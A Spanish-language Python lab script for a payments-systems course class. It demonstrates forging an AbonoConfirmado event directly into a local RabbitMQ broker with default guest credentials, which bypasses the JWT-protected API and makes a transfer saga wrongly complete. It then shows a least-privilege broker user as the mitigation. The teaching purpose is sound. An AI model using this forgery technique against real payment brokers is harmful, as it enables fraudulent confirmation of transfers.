#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
LA PUERTA QUE EL JWT NO CUIDA - Clase 9 (Red Bre-B Colombia, 190304014-1)

/confirmar-abono exige un token del banco destino. Pero ese endpoint solo
PUBLICA un evento AbonoConfirmado en RabbitMQ, y la saga le cree al evento.
¿Que pasa si alguien publica el evento directamente en el broker?

  Transferencia A: se le publica un AbonoConfirmado FALSO por el broker.
  Transferencia B: control — nadie hace nada, debe compensarse a los 15 s.

Despues prueba la mitigacion: un usuario del broker con permisos minimos.

Solo biblioteca estandar. Uso:  python ataque-broker-clase9.py [puerto_api]
"""
import base64
import json
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from datetime import datetime, timezone

PUERTO = sys.argv[1] if len(sys.argv) > 1 else "5080"
API = "http://localhost:%s" % PUERTO
RABBIT = "http://localhost:15673/api"
CUENTA = "11111111-1111-1111-1111-111111111111"
EXCHANGE = "Breb.Cuentas.Contratos:AbonoConfirmado"


def http(metodo, url, cuerpo=None, token=None, basico=None):
    datos = json.dumps(cuerpo).encode() if cuerpo is not None else (b"" if metodo in ("POST", "PUT") else None)
    req = urllib.request.Request(url, method=metodo, data=datos)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", "Bearer " + token)
    if basico:
        req.add_header("Authorization", "Basic " + base64.b64encode(("%s:%s" % basico).encode()).decode())
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def psql(q):
    r = subprocess.run(["docker", "exec", "breb-postgres", "psql", "-U", "postgres", "-d",
                        "brebcuentas", "-t", "-A", "-F", "|", "-c", q],
                       capture_output=True, text=True)
    return [l for l in r.stdout.strip().splitlines() if l]


def publicar(tid, credencial):
    """Publica un AbonoConfirmado con el sobre JSON que MassTransit espera."""
    ahora = datetime.now(timezone.utc).isoformat()
    sobre = {
        "messageId": str(uuid.uuid4()),
        "messageType": ["urn:message:Breb.Cuentas.Contratos:AbonoConfirmado"],
        "message": {"transferenciaId": tid, "confirmadoEn": ahora},
        "sentTime": ahora,
    }
    url = "%s/exchanges/%%2F/%s/publish" % (RABBIT, urllib.parse.quote(EXCHANGE, safe=""))
    return http("POST", url, basico=credencial, cuerpo={
        "properties": {"content_type": "application/vnd.masstransit+json"},
        "routing_key": "", "payload": json.dumps(sobre), "payload_encoding": "string"})


def verificar_api():
    """Falla temprano y con un mensaje util, no con un traceback."""
    try:
        urllib.request.urlopen(API + "/swagger/index.html", timeout=4)
    except Exception:
        print()
        print("[X] Nadie responde en %s" % API)
        print()
        print("    Si arrancaste con  dotnet run --urls http://localhost:%s" % PUERTO)
        print("    revisa que la consola diga 'Bus started'.")
        print("    Si arrancaste desde Visual Studio (Ctrl+F5) o con 'dotnet run' a secas,")
        print("    el puerto es 5051:   python %s 5051" % sys.argv[0])
        print()
        sys.exit(1)


verificar_api()


print("=" * 78)
print("  LA PUERTA QUE EL JWT NO CUIDA")
print("=" * 78)

c, t = http("POST", API + "/token", {"usuario": "ana.operadora", "clave": "Operadora-2026"})
if c != 200:
    print("[X] /token respondio %d" % c)
    sys.exit(1)
op = json.loads(t)["token"]

# No se reinicia el saldo: con retenciones vivas, un UPDATE a mano descuadra
# el total contra la tabla Retenciones. Se espera a que el sistema quede en
# reposo y se compara antes contra despues.
for _ in range(40):
    vivas = psql('SELECT COUNT(*) FROM "TransferenciaSagas";')
    if vivas and vivas[0] == "0":
        break
    time.sleep(1)
antes = psql('SELECT "SaldoDisponible", "SaldoRetenido" FROM "Cuentas" WHERE "Id"=\'%s\';' % CUENTA)

_, a = http("POST", API + "/cuentas/%s/retener?montoUVB=100" % CUENTA, token=op)
_, b = http("POST", API + "/cuentas/%s/retener?montoUVB=100" % CUENTA, token=op)
tid_a, tid_b = json.loads(a)["transferenciaId"], json.loads(b)["transferenciaId"]
print("\n  Dos transferencias de 100 UVB retenidas con un token de operador legitimo:")
print("    A = %s   <- se le falsifica la confirmacion" % tid_a)
print("    B = %s   <- control, nadie la toca" % tid_b)

# ── El ataque: sin token, sin API, directo al broker ─────────────────────
time.sleep(2)
c, r = http("POST", API + "/transferencias/%s/confirmar-abono" % tid_a)
print("\n  1. Confirmar A por la API SIN token:                 HTTP %d" % c)
c, r = publicar(tid_a, ("guest", "guest"))
print("  2. Publicar AbonoConfirmado de A en RabbitMQ (guest): HTTP %d %s" % (c, r))

print("\n  Esperando 22 s (el timeout de la saga es 15 s)...")
time.sleep(22)

filas = psql('SELECT "TransferenciaId", "Liberada" FROM "Retenciones" WHERE "TransferenciaId" IN (\'%s\',\'%s\');'
             % (tid_a, tid_b))
estado = {f.split("|")[0]: f.split("|")[1] for f in filas}
sagas = psql('SELECT COUNT(*) FROM "TransferenciaSagas" WHERE "CorrelationId" IN (\'%s\',\'%s\');' % (tid_a, tid_b))
saldo = psql('SELECT "SaldoDisponible", "SaldoRetenido" FROM "Cuentas" WHERE "Id"=\'%s\';' % CUENTA)

def leer(tid):
    return "LIBERADA (se compenso, el dinero volvio)" if estado.get(tid) == "t" \
        else "NO liberada (la saga la dio por COMPLETADA)"

print("\n  RESULTADO")
print("    A (confirmacion falsa): %s" % leer(tid_a))
print("    B (control):            %s" % leer(tid_b))
print("    Sagas vivas de A y B:   %s" % (sagas[0] if sagas else "?"))
print("    Saldo antes:            disponible|retenido = %s" % (antes[0] if antes else "?"))
print("    Saldo despues:          disponible|retenido = %s" % (saldo[0] if saldo else "?"))
print("    -> Los 100 UVB de A NO volvieron: para el sistema, el banco destino los recibio.")

# ── La mitigacion: un usuario del broker con permisos minimos ────────────
print("\n  MITIGACION: usuario 'breb-auditor' que solo puede LEER")
adm = ("guest", "guest")
http("PUT", RABBIT + "/users/breb-auditor", basico=adm,
     cuerpo={"password": "auditor-lab-2026", "tags": "management"})
http("PUT", RABBIT + "/permissions/%2F/breb-auditor", basico=adm,
     cuerpo={"configure": "^$", "write": "^$", "read": ".*"})
_, c2 = http("POST", API + "/cuentas/%s/retener?montoUVB=1" % CUENTA, token=op)
c, r = publicar(json.loads(c2)["transferenciaId"], ("breb-auditor", "auditor-lab-2026"))
print("    Publicar AbonoConfirmado como breb-auditor: HTTP %d %s" % (c, r[:90]))
http("DELETE", RABBIT + "/users/breb-auditor", basico=adm)
print("    (usuario breb-auditor eliminado)")
print("=" * 78)
